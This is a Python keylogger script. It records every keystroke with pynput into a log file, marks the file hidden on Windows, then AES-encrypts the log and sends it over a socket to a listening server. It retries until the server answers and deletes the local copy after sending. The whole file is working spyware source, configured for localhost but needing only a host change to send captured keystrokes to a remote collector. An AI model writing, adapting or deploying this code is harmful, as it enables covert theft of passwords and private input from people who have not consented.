#Uses pynput to detect and record keyboard input and stores it to a file called log.txt, the script is terminated upon a ESC key press.
from pynput import keyboard
import logging
import os
import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from base64 import b64encode
import time


filename = 'log.txt'

#Ensure that there is no file called log.txt
try:
    os.remove(filename)
except:
    logging.basicConfig(filename=filename,level=logging.DEBUG, filemode= 'w', format= '%(asctime)s - %(message)s', datefmt = '%d-%b-%y %H:%M:%S')

#Set the file log.txt to become hidden, print error results in the log.
try:
    os.system(f'attrib +h {filename}')
    logging.info("file set as hidden.")
except Exception as e:
    logging.info("error setting file as hidden.")

def on_press(key):
    #Logs the keystroke into log.txt
    try:
        logging.info(str(key))
    except AttributeError:
        logging.info("error")

def on_release(key):
    #Terminate the Script
    if key == keyboard.Key.esc:
        print("script terminated.\n")
        logging.info("script termintaed")
        listener.stop()
        return False
        
#initializes the listener and tells it what functions to call upon a key press and release.
with keyboard.Listener(
    on_press = on_press,
    on_release=on_release
) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        print("script terminated.\n")

logging.shutdown()

#Sender Socket

#Uses CBC Cipher, key is custom
key = b"Key For Testing."
cipher = AES.new(key, AES.MODE_CBC)


#Server config
HOST = "localhost"
PORT = 9999

#Try to listen for the server, keeps repeating until it connects
while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST, PORT))

        #Read in the file log.txt as bytes
        with open(filename, "rb") as s:
            data = s.read()

        #Encrypt log.txt byte data
        ciphertext_bytes = cipher.encrypt(pad(data, AES.block_size))
        iv = b64encode(cipher.iv)
        ciphertext = b64encode(ciphertext_bytes)

        #Send Log File
        client.send("newlog.txt".encode('utf-8'))
        client.send(ciphertext)
        client.send(b"<IV>")
        client.send(iv)
        client.send(b"<END>")
        client.close()

        os.remove(filename)

        break
    except Exception as e:
        print("error connecting, trying again.")
        time.sleep(2)
        print(".")
        time.sleep(2)
        print(".")
        time.sleep(1)